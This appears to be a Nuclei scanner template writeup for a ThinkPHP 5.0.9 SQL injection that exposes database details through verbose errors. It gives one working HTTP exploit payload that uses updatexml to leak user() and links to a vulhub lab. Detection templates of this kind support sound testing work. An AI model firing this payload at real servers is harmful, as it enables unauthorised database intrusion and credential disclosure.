# Nuclei Template: ThinkPHP 5.0.9 - Information Disclosure
**Template ID:** thinkphp-509-information-disclosure
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**Source:** Nuclei Template (`thinkphp-509-information-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

## References
- https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection
